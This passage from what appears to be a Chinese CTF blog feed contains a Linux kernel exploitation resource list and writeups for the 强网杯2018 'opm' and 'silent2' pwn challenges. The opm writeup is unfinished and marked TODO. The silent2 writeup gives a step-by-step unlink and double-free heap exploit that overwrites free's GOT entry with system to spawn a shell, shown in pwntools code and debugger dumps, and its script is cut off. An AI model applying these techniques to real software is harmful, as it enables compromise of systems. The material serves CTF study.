      <content type="html"><![CDATA[<h2 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h2><p>进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应漏洞，可以用gdb+qemu，也可以用另一台机器编译内核。然后查看源码并调试，这可以折腾自己喜欢的编辑器，并对照相应的补丁，了解更多细节。最后可以尝试在poc的基础上写自己的exp。自己直接阅读 Linux kernel 源码的话可能无从下手，可以先了解一下Linux内核源码目录结构，比如 drivers是设备驱动、arch是cpu相关代码、virt是虚拟化相关、security实现安全特性等等。然后从Linux内核可以被攻击的方面出发，比如系统调用、驱动、进程管理、网络，然后查找相应cve，比如CVE-2017-5123属于系统调用的漏洞。了解常见的攻击类型，比如栈溢出、堆溢出、UAF、整数溢出、race condition、权限检查不当、类型转换错误等等。了解Linux内核的防护机制，比如KASLR、SMEP、SELINUX等等。</p><h3 id="Interactive-map-of-Linux-kernel"><a href="#Interactive-map-of-Linux-kernel" class="headerlink" title="Interactive map of Linux kernel"></a>Interactive map of Linux kernel</h3><p><a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">http://www.makelinux.net/kernel_map/</a></p><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><h3 id="《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani"><a href="#《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani" class="headerlink" title="《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani"></a>《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani</h3><p><a href="http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8" target="_blank" rel="noopener">http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8</a></p><h3 id="《Linux-Kernel-Architecture》，Wolfgang-Mauerer"><a href="#《Linux-Kernel-Architecture》，Wolfgang-Mauerer" class="headerlink" title="《Linux Kernel Architecture》，Wolfgang Mauerer"></a>《Linux Kernel Architecture》，Wolfgang Mauerer</h3><p><a href="http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79" target="_blank" rel="noopener">http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79</a></p><h3 id="《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds"><a href="#《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds" class="headerlink" title="《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds"></a>《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds</h3><p><a href="http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC" target="_blank" rel="noopener">http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC</a></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="Linux内核源码"><a href="#Linux内核源码" class="headerlink" title="Linux内核源码"></a>Linux内核源码</h3><p><a href="https://github.com/torvalds/linux" target="_blank" rel="noopener">https://github.com/torvalds/linux</a></p><h3 id="Linux各版本内核"><a href="#Linux各版本内核" class="headerlink" title="Linux各版本内核"></a>Linux各版本内核</h3><p><a href="https://www.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://www.kernel.org/pub/linux/kernel/</a></p><h3 id="Linux内核代码在线查看"><a href="#Linux内核代码在线查看" class="headerlink" title="Linux内核代码在线查看"></a>Linux内核代码在线查看</h3><p><a href="http://lxr.free-electrons.com" target="_blank" rel="noopener">http://lxr.free-electrons.com</a></p><h2 id="exp及分析文章"><a href="#exp及分析文章" class="headerlink" title="exp及分析文章"></a>exp及分析文章</h2><h3 id="linux-kernel-exploits"><a href="#linux-kernel-exploits" class="headerlink" title="linux-kernel-exploits"></a>linux-kernel-exploits</h3><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p><h3 id="kernel-exploit"><a href="#kernel-exploit" class="headerlink" title="kernel exploit"></a>kernel exploit</h3><p><a href="https://github.com/lucyoa/kernel-exploits" target="_blank" rel="noopener">https://github.com/lucyoa/kernel-exploits</a></p><h3 id="kernel-heap-overflow利用"><a href="#kernel-heap-overflow利用" class="headerlink" title="kernel heap overflow利用"></a>kernel heap overflow利用</h3><p><a href="https://zhuanlan.zhihu.com/p/26674557" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26674557</a></p><h3 id="kernel-exploit-适合入门"><a href="#kernel-exploit-适合入门" class="headerlink" title="kernel exploit(适合入门)"></a>kernel exploit(适合入门)</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf</a></p><h3 id="blackhat-kernel议题"><a href="#blackhat-kernel议题" class="headerlink" title="blackhat kernel议题"></a>blackhat kernel议题</h3><p><a href="https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf" target="_blank" rel="noopener">https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf</a></p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><h3 id="syzkaller"><a href="#syzkaller" class="headerlink" title="syzkaller"></a>syzkaller</h3><p>这个链接的前半部分的内容详细解释了如何搭建一个qemu + gdb的环境<br><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><h3 id="Awesome-Fuzzing"><a href="#Awesome-Fuzzing" class="headerlink" title="Awesome-Fuzzing"></a>Awesome-Fuzzing</h3><p><a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="x86-64-Assembly"><a href="#x86-64-Assembly" class="headerlink" title="x86_64 Assembly"></a>x86_64 Assembly</h3><p><a href="https://0xax.github.io/categories/assembler/" target="_blank" rel="noopener">https://0xax.github.io/categories/assembler/</a></p><h3 id="64-bit-system-call-numbers-and-entry-vectors"><a href="#64-bit-system-call-numbers-and-entry-vectors" class="headerlink" title="64-bit system call numbers and entry vectors"></a>64-bit system call numbers and entry vectors</h3><p><a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p><h3 id="翻过的文章记录"><a href="#翻过的文章记录" class="headerlink" title="翻过的文章记录"></a>翻过的文章记录</h3><p>深入理解linux系统下proc文件系统内容<br><a href="http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html" target="_blank" rel="noopener">http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html</a><br>What is mode_t in C?<br><a href="https://jameshfisher.com/2017/02/24/what-is-mode_t.html" target="_blank" rel="noopener">https://jameshfisher.com/2017/02/24/what-is-mode_t.html</a><br>Understanding a Kernel Oops!<br><a href="http://opensourceforu.com/2011/01/understanding-a-kernel-oops/" target="_blank" rel="noopener">http://opensourceforu.com/2011/01/understanding-a-kernel-oops/</a><br>Linux Kernel Procfs Guide<br><a href="https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf" target="_blank" rel="noopener">https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf</a><br>用户空间与内核空间数据交换的方式(2)——procfs<br><a href="http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html" target="_blank" rel="noopener">http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html</a><br>用户空间和内核空间传递数据：get_user；put_user;copy_to_user;copy_from_user<br><a href="http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html" target="_blank" rel="noopener">http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html</a><br>谈结构体struct 初始化多出的点号“.”，数组[]初始化多出的逗号“,”<br><a href="https://blog.csdn.net/comwise/article/details/9087279" target="_blank" rel="noopener">https://blog.csdn.net/comwise/article/details/9087279</a><br>Root exploit for Android and Linux（CVE-2010-4258）<br><a href="https://blog.csdn.net/hu3167343/article/details/36892563" target="_blank" rel="noopener">https://blog.csdn.net/hu3167343/article/details/36892563</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>强网杯2018 opm writeup</title>
      <link href="/2018/03/27/opm/"/>
      <url>/2018/03/27/opm/</url>
      <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/qiang/opm$ checksec opm</span><br><span class="line">[*] &apos;/home/parallels/ctf/qiang/opm/opm&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>Add函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-083349.png" alt=""><br>创建一个结构体role，如果没创建过，可以参考<a href="https://blog.csdn.net/hgy413/article/details/7104304" target="_blank" rel="noopener">这篇文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 role            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 func            dq ?</span><br><span class="line">00000008 m_name          dq ?</span><br><span class="line">00000010 m_length        dq ?</span><br><span class="line">00000018 m_punchNum      dq ?</span><br><span class="line">00000020 role            ends</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-084850.png" alt=""></p><p>Show<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-085347.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>输入name和punch count时。由于没有限制输入大小，造成栈溢出。能覆盖堆指针，堆指针随函数返回保存中bss段。<br>通过这两次的溢出就能很容易更改堆指针指向其它地址。</p><h3 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h3><p>头文件：#include <stdlib.h></stdlib.h></p><p>atoi() 函数用来将字符串转换成整数(int)，其原型为：<br>int atoi (const char * str);</p><p>【函数说明】atoi() 函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(‘\0’)才结束转换，并将结果返回。</p><p>【返回值】返回转换后的整型数；如果 str 不能转换成 int 或者 str 为空字符串，那么将返回 0。</p><h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>待补充</p><p>正常添加role<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555554000+0x2020E0</span><br><span class="line">0x5555557560e0:0x0000555555768c200x0000000000000000</span><br><span class="line">0x5555557560f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x0000555555768c20</span><br><span class="line">0x555555768c20:0x0000555555554b30-&gt;func0x0000555555768c50-&gt;name的堆指针</span><br><span class="line">0x555555768c30:0x0000000000000070-&gt;name的长度0x0000000000000001-&gt;punch count</span><br><span class="line">存放name的chunk</span><br><span class="line">0x555555768c40:0x00000000000000000x0000000000000081</span><br><span class="line">0x555555768c50:0x41414141414141410x4141414141414141</span><br><span class="line">0x555555768c60:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure><p>第二次添加role，并进行堆溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555554000+0x2020E0</span><br><span class="line">0x5555557560e0:0x0000555555768c200x0000555555760010-&gt;被溢出修改</span><br><span class="line">0x5555557560f0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x555555768cc0 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x555555554b30, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555768cf0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 145, </span><br><span class="line">  fd = 0x4242424242424242, </span><br><span class="line">  bk = 0x4242424242424242, </span><br><span class="line">  fd_nextsize = 0x4242424242424242, </span><br><span class="line">  bk_nextsize = 0x4242424242424242</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-181107.png" alt=""><br>可以看到真正的堆指针应该是0x555555768cc0，而因为溢出，\x00\x10覆盖了最后两个字节，堆指针被修改为0x555555760010<br>此后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x0000555555760010</span><br><span class="line">0x555555760010:0x00000000000000000x0000555555768d00-&gt;name的堆地址</span><br><span class="line">0x555555760020:0x00000000000000810x0000000000000002</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x0000555555768d00</span><br><span class="line">0x555555768d00:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d10:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d20:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d30:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d40:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d50:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d60:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d70:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d80:0x00000000000000100x0000000000020281</span><br><span class="line">0x555555768d90:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>第三次创建role。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;C&apos;*0x80</span><br><span class="line">payload1 = &apos;3&apos;+&apos;P&apos;*0x7f+&apos;\x10&apos;</span><br><span class="line">add(payload,payload1)</span><br></pre></td></tr></table></figure></p><p>首先,第一次栈溢出，可以看到本来v6在0x555555768d80，然后被payload溢出了一个字节，变成了0x555555768d00。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x555555768d80 FASTBIN &#123;</span><br><span class="line">  prev_size = 16, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x555555554b30, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而这个地址刚好就是第二次的name堆指针所指向的chunk。<br>于是写入之后，就变成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555768d00</span><br><span class="line">0x555555768d00:0x42424242424242420x0000555555768dc0-&gt;name堆指针</span><br><span class="line">0x555555768d10:0x00000000000000800x4242424242424242</span><br></pre></td></tr></table></figure></p><p>然后再次溢出，使得v6的值修改为0x555555760010，这是第二次的堆指针，这样修改之后，在打印函数里，就会<strong>将我们修改过后</strong>的<strong>第二次的name值</strong>，再次打印出来。<br>这样就leak出了第三次分配的name的堆地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-184721.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555554000+0x2020E0</span><br><span class="line">0x5555557560e0:0x0000555555768c200x0000555555760010</span><br><span class="line">0x5555557560f0:0x00005555557600100x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="leak-got表"><a href="#leak-got表" class="headerlink" title="leak got表"></a>leak got表</h3><p>有了堆地址就可以泄露存放在堆中的函数指针，从而有了got表的地址。<br>存放函数指针的地址在p64(heap_addr‐0x30)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x0000555555768dc0-0x30</span><br><span class="line">0x555555768d90:0x0000555555554b30-&gt;函数指针0x0000000000000000</span><br><span class="line">0x555555768da0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>TODO</p><h3 id="leak-system"><a href="#leak-system" class="headerlink" title="leak system"></a>leak system</h3><p>TODO</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>TODO</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>强网杯2018 silent2 writeup</title>
      <link href="/2018/03/26/silen2/"/>
      <url>/2018/03/26/silen2/</url>
      <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~$ checksec &apos;/home/parallels/ctf/qiang/silent2/silent2&apos; </span><br><span class="line">[*] &apos;/home/parallels/ctf/qiang/silent2/silent2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>看了一下左边的所有函数，一个用来输出的都没有，不过有system<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-112825.png" alt=""></p><p>main函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-142332.png" alt=""><br>add函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-142343.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-142535.png" alt=""><br>delete函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-142746.png" alt=""><br>edit函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-142821.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>Partial RELRO，直接改写GOT段，把free@got的地址改写为system，当调用free的时候，就可以执行system函数了。<br>在unlink的时候，有一处覆写可以利用，然后在地址0x6020c0开始处保存了堆的指针，如果该处堆的指针可以被改写，即在这里改写为free@got的地址。<br>那么在以后edit函数调用了，就可以改写指针对应地址的数据了，即改写free@got为system。</p><h3 id="堆构造"><a href="#堆构造" class="headerlink" title="堆构造"></a>堆构造</h3><p>首先创建两个堆，并free掉。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x100</span>,<span class="string">'DDDD'</span>) <span class="comment">#4</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">'EEEE'</span>) <span class="comment">#5</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure></p><p>然后再创建一个大小为0x210的堆，就会再次malloc出我们之前free的空间，并在这里面伪造两个chunk。<br>第一个chunk用来绕过unlink的检查条件，第二个chunk，嗯……也是用来绕过unlink的检查条件，并且在free的时候触发unlink。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0)+p64(0x101)+p64(p_addr‐0x18)+p64(p_addr‐0x10)+&apos;A&apos;*(0x100‐0x20)+p64(0x100)+p64(0x210‐0x100)</span><br><span class="line">create(0x210,payload)</span><br></pre></td></tr></table></figure></p><p>结果如图：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-161859.jpg" alt=""><br>注意这里p_addr是0x6020D8,也就是说它就指向我们fake的chunk1。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-163221.jpg" alt=""><br>然后再次delete index 4，这里就是double free，就触发了unlink，通过fake两个chunk，让我们通过Unlink的检查。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(4) # double free</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure><p>unlink检查通过之后就是设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p><p>P就是fake_chunk1,可以看出fake_chunk1-&gt;fd-&gt;bk和fake_chunk1-&gt;bk-&gt;fd都指向fake_chunk1,所以只需要关注第二次操作即可。<br>P-&gt;fd即fake_chunk1-&gt;fd=p_addr-0x18,即0x6020C0。<br>所以unlink之后,P-&gt;bk-&gt;fd变为即0x6020C0。<br>如图：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-164129.jpg" alt=""><br>这样，我们编辑index 3就是在修改index 0处堆的指针，将这个值改为free_got_plt。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modify(3,p64(free_got_plt)[0:4],&apos;1111&apos;)</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure></p><p>然后再编辑index 0，因为此时这里的堆的指针已经是指向free_got_plt的了，所以此时再编辑index 0，就是在修改free_got_plt的值。<br>修改为call system的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modify(0,p64(func_addr)[0:6],&apos;2222&apos;)</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure></p><p>最后我们创建一个chunk，写入/bin/sh，并free掉，此时free调用的是system函数，getshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x100,&apos;/bin/sh\x00&apos;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">delete(6)</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-165130.png" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./silent2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, content1, content2)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.send(content1)</span><br><span class="line">    p.send(content2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'sakura1328\n'</span>) <span class="comment"># 自己创建的banner.txt文件的内容</span></span><br><span class="line"></span><br><span class="line">func_addr = <span class="number">0x4009C0</span></span><br><span 